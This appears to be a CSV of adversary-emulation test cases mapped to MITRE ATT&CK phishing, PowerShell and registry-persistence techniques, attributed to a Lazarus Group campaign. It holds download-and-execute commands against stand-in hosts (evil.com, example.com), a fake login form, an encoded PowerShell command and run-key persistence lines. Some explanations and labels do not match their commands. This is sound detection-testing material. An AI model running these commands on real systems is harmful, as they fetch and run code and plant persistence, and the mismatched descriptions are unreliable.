command_id,ttp_id,mitre_attack_id,technique_name,tactic,platform,name,command,explanation,indicators,prerequisites,cleanup,threat_actor,campaign,confidence_score
1afeef83-c82a-4d60-b7e4-c3fcb7acdf8e,real-T1566.001,T1566.001,Phishing,Initial Access,windows,Simulate Spearphishing with a Malicious Macro-Enabled Document,"powershell -c ""Invoke-WebRequest -Uri 'http://evil.com/payload.docm' -OutFile 'C:\Users\Public\Documents\invoice.docm'; Start-Process -FilePath 'C:\Users\Public\Documents\invoice.docm'""","This command simulates a spearphishing attack by downloading a macro-enabled document (.docm) from a controlled web server (evil.com). The document, when opened, would ideally contain a malicious macro. This command uses PowerShell to download the file and then opens it using Start-Process.  This will not execute the macro, it only downloads and opens the document.","Network traffic to evil.com (HTTP GET request for payload.docm), File creation in C:\Users\Public\Documents\invoice.docm, Process execution: WINWORD.EXE (or the associated word processor) running with the downloaded document.","A Windows test environment., A web server (evil.com) hosting a harmless, macro-enabled .docm file (e.g., a document with a harmless macro that displays a message box).  This is CRUCIAL for safety.  Do not use a real malicious macro., Ensure PowerShell execution policy allows script execution (e.g., RemoteSigned or unrestricted, although this is not a security best practice).",Remove the downloaded file: Remove-Item 'C:\Users\Public\Documents\invoice.docm' -Force,lazarus group,Lazarus Group - Credential Harvesting Campaign Using Mimikatz,0.7
db7dc6c2-5afa-4b90-ae07-6ef4db26791d,real-T1566.001,T1566.001,Phishing,Initial Access,windows,Simulate Spearphishing with a Link to a Credential Harvesting Site,"powershell -c ""Invoke-WebRequest -Uri 'https://tinyurl.com/y8888888' -OutFile 'C:\Users\Public\Documents\phish_report.html'; Start-Process -FilePath 'C:\Users\Public\Documents\phish_report.html'""","This command simulates a spearphishing attack by creating a link to a credential harvesting site using a URL shortener (tinyurl.com). The command uses PowerShell to download an HTML file from the shortened URL and saves it to the public documents folder. The document, when opened, would ideally contain a link to a credential harvesting site. This command uses PowerShell to download the file and then opens it using Start-Process.  This will not actually send credentials, it only downloads and opens the document.","Network traffic to tinyurl.com and then the destination site specified by tinyurl., File creation in C:\Users\Public\Documents\phish_report.html, Process execution:  A web browser (e.g., chrome.exe, firefox.exe, msedge.exe) running with the downloaded HTML file.","A Windows test environment., A benign HTML file or a local file hosted on a web server that contains a link to a credential harvesting site (e.g. your local webserver)., A URL shortener service (e.g., tinyurl.com) to mask the actual URL to the HTML file., Ensure PowerShell execution policy allows script execution (e.g., RemoteSigned or unrestricted, although this is not a security best practice).",Remove the downloaded file: Remove-Item 'C:\Users\Public\Documents\phish_report.html' -Force,lazarus group,Lazarus Group - Credential Harvesting Campaign Using Mimikatz,0.7
0d70e839-35b9-4256-8d02-92827460a3e4,real-T1566.001,T1566.001,Phishing,Initial Access,linux,Simulate Spearphishing Attachment Delivery - Download & Execute,wget https://example.com/malicious_script.sh -O /tmp/malicious_script.sh && chmod +x /tmp/malicious_script.sh && /tmp/malicious_script.sh,"This simulates a spearphishing attack by downloading a bash script from a controlled server (example.com), saving it to /tmp, making it executable, and then running it. The script itself should be harmless (e.g., echo a message, create a dummy file) to ensure safety. Replace 'example.com' with a controlled, safe server. The script simulates the victim opening a malicious attachment.","wget process in process monitoring, chmod +x in process monitoring, Execution of /tmp/malicious_script.sh in process monitoring, Network connection to example.com (or the chosen server) in network monitoring, File creation in /tmp/ (if the script creates a file)","A Linux environment with wget installed., A controlled web server to host the 'malicious_script.sh' file (e.g., using Python's http.server module or a similar simple server)., Ensure the script hosted is harmless.",rm -f /tmp/malicious_script.sh,lazarus group,Lazarus Group - Credential Harvesting Campaign Using Mimikatz,0.7
7efcd640-f1be-4fed-97d5-6159352c1c98,real-T1566.001,T1566.001,Phishing,Initial Access,linux,Simulate Spearphishing - Credential Harvesting Simulation,"python3 -m http.server 8000 & echo -e '<html><body><h1>Login</h1><form action=""/submit"" method=""POST""><input type=""text"" name=""username"" placeholder=""Username""><input type=""password"" name=""password"" placeholder=""Password""><button type=""submit"">Login</button></form></body></html>' > /tmp/login.html",This simulates a credential harvesting attempt. It starts a simple HTTP server (using Python's built-in module) that serves a basic HTML page. This page contains a login form.  The form's action is set to '/submit' to simulate sending credentials.  This is a simplified simulation of a phishing site.  The use of the Python HTTP server ensures a safe environment.  This does NOT actually harvest credentials; it simulates the initial stage.,"Process monitoring for python3, and http.server, Network connection on port 8000, File creation /tmp/login.html, HTTP requests to the server (if a browser is used to access it)",A Linux environment with Python 3 installed.,kill $(pgrep -f 'python3 -m http.server') && rm -f /tmp/login.html,lazarus group,Lazarus Group - Credential Harvesting Campaign Using Mimikatz,0.7
089a6154-c9ce-4bc5-a594-8f33d8071d20,real-T1059.001,T1059.001,PowerShell,Execution,windows,Download and Execute a Simple Script from the Internet (Invoke-WebRequest),"powershell -c ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitre/attack-navigator/master/layers/example.json' -OutFile 'C:\Users\Public\example.json'""","This command uses PowerShell's `Invoke-WebRequest` cmdlet to download a JSON file (an example ATT&CK layer) from a public GitHub repository and saves it to the public user directory. This simulates an attacker downloading a malicious script or configuration file.  The example.json file is a safe, publicly available file, so this is a safe test.","Event logs (e.g., Security, System) showing PowerShell process creation., Network traffic to raw.githubusercontent.com., File creation in C:\Users\Public\example.json., PowerShell process command-line arguments containing Invoke-WebRequest and the target URL.","A Windows system with PowerShell installed (default on modern Windows versions)., Network connectivity to the internet.",Remove the downloaded file: `Remove-Item 'C:\Users\Public\example.json' -Force`,lazarus group,Lazarus Group - Credential Harvesting Campaign Using Mimikatz,0.7
b0d718f9-d232-4621-896f-d3c0c80ca33a,real-T1059.001,T1059.001,PowerShell,Execution,windows,Base64 Encoded PowerShell Command (Simple Echo),"powershell -EncodedCommand ""UwBlAHQALQBVAHMAZQByAFEAdQBhAGwAaQB0AHkAIABTAHQAYQB0AHUAcwAgAC0AUABhAHMAcwB3AG8AcgBkACAAIgB0AGUAcwB0ACIA""","This command demonstrates the use of `-EncodedCommand` to execute a base64 encoded PowerShell command.  The encoded command simply sets the user's password quality to 'test' which is harmless. This simulates a common obfuscation technique used by attackers to hide malicious commands. This particular encoded string decodes to `Set-UserQuality Status -Password ""test""`. Note: The command used does not affect any user and is an example of a benign encoded command.","Event logs showing PowerShell process creation., PowerShell process command-line arguments containing -EncodedCommand., Potentially, file system access if the command was more complex (not in this harmless example).",A Windows system with PowerShell installed.,There is no cleanup necessary as the command does not modify the system.,lazarus group,Lazarus Group - Credential Harvesting Campaign Using Mimikatz,0.7
3dd0ce1f-fde7-4af3-8ec0-c2822aa35933,real-T1059.001,T1059.001,PowerShell,Execution,linux,Simulate PowerShell execution using pwsh to list files,"pwsh -c ""Get-ChildItem -Path /home/$USER""","This command simulates PowerShell execution on Linux using pwsh. It utilizes the `Get-ChildItem` cmdlet, which is analogous to `ls` or `dir`, to list files and directories within the user's home directory. This tests for the presence of pwsh and the execution of basic PowerShell cmdlets. The command is safe because it only reads files and does not modify the system.","Process execution: pwsh, Command-line arguments: -c ""Get-ChildItem -Path /home/$USER"", Output: Listing of files and directories in the user's home directory, similar to `ls` output., Event logs (if enabled): Process creation events with pwsh as the parent process.","pwsh (PowerShell) must be installed on the Linux system., A user account must exist.","No cleanup is necessary, as the command only reads data.",lazarus group,Lazarus Group - Credential Harvesting Campaign Using Mimikatz,0.7
7cf055c5-b23f-492d-ac4b-2e5497c4ce07,real-T1059.001,T1059.001,PowerShell,Execution,linux,Simulate PowerShell execution using pwsh to write to a file,"pwsh -c ""'Hello, PowerShell on Linux!' | Out-File -FilePath /tmp/powershell_test.txt""","This command uses `pwsh` to execute a PowerShell command that writes a string to a file. It simulates a basic file write operation.  The string 'Hello, PowerShell on Linux!' is piped to `Out-File`, which writes it to the specified file path. This is a safe test because it writes to a temporary file.","Process execution: pwsh, Command-line arguments: -c ""'Hello, PowerShell on Linux!' | Out-File -FilePath /tmp/powershell_test.txt"", File creation: /tmp/powershell_test.txt, File content: The content of /tmp/powershell_test.txt will contain 'Hello, PowerShell on Linux!', Event logs (if enabled): Process creation events with pwsh as the parent process and file write events., Potential for network connections if `Out-File` is redirected to a network share (unlikely in this safe example).","pwsh (PowerShell) must be installed on the Linux system., User must have write permissions to the /tmp directory.",rm /tmp/powershell_test.txt,lazarus group,Lazarus Group - Credential Harvesting Campaign Using Mimikatz,0.7
15e498eb-4b1f-4d8d-a869-4d9df47abd06,real-T1547.001,T1547.001,Registry Run Keys,Persistence,windows,Create Registry Run Key for Notepad.exe,"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""NotepadStartup"" /t REG_SZ /d ""C:\Windows\System32\notepad.exe"" /f","This command adds a Registry Run key to the current user's (HKCU) Registry. It creates a new value named 'NotepadStartup' under the 'Run' key. The value's data is set to the path of notepad.exe.  This means that every time the user logs in, notepad.exe will be executed.  The /f flag forces the operation without prompting.","New Registry key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\NotepadStartup, Notepad.exe process spawns upon user login.",A Windows user account with sufficient privileges to modify the HKCU registry hive.,"reg delete ""HKCU\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""NotepadStartup"" /f",lazarus group,Lazarus Group - Credential Harvesting Campaign Using Mimikatz,0.7
b905044a-9577-406c-8df4-ff45589b7d14,real-T1547.001,T1547.001,Registry Run Keys,Persistence,windows,Create Registry Run Key for a PowerShell Script,"powershell -c ""Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'MyStartupScript' -Value 'powershell -ExecutionPolicy Bypass -File \'C:\Temp\startup_script.ps1\''""","This command creates a Registry Run key to execute a PowerShell script located at C:\Temp\startup_script.ps1. It leverages PowerShell's `Set-ItemProperty` cmdlet to add an entry named 'MyStartupScript' to the Run key in HKCU. The -ExecutionPolicy Bypass parameter allows the script to run without policy restrictions. The script itself (startup_script.ps1) would need to exist and contain the desired commands. For testing purposes, the startup_script.ps1 could simply create a file or log an event.","New Registry key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MyStartupScript, Powershell.exe process spawns upon user login., Execution of the script located at C:\Temp\startup_script.ps1 (if it exists). Check the script's intended behavior.","A Windows user account with sufficient privileges to modify the HKCU registry hive., The C:\Temp directory must exist., Create a file named startup_script.ps1 in C:\Temp.  For testing, the script contents can be: `New-Item -ItemType File -Path C:\Temp\test_file.txt -Force`",Remove-Item -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\MyStartupScript' -Force; Remove-Item -Path C:\Temp\test_file.txt -Force,lazarus group,Lazarus Group - Credential Harvesting Campaign Using Mimikatz,0.7
